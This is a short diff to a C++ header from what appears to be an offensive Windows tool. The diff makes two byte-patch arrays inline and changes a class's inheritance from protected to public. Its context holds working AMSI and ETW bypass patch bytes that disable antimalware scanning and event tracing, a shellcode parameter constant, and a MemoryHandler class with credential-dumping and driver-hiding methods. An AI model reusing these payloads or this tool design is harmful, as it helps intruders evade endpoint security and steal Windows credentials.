@@ -4,8 +4,8 @@
 
 constexpr wchar_t AMSI_PATH[] = LR"(C:\Windows\System32\Amsi.dll)";
 constexpr wchar_t NTDLL_PATH[] = LR"(C:\Windows\System32\ntdll.dll)";
-std::vector<byte> AMSI_BYPASS_PAYLOAD = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
-std::vector<byte> ETW_BYPASS_PAYLOAD = { 0xC3 };
+inline std::vector<byte> AMSI_BYPASS_PAYLOAD = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+inline std::vector<byte> ETW_BYPASS_PAYLOAD = { 0xC3 };
 constexpr SIZE_T MAX_SHELLCODE_PARAMETERS = 3;
 
 class MemoryHandlerException : public std::runtime_error {
@@ -19,7 +19,7 @@ public:
 	}
 };
 
-class MemoryHandler : protected CommandHandler {
+class MemoryHandler : public CommandHandler {
 private:
 	std::vector<Credentials> DumpCredentials(_Inout_ std::shared_ptr<DesKeyInformation> desKey);
 	bool HideDriver(_In_ std::wstring driverPath, _In_ bool hide);
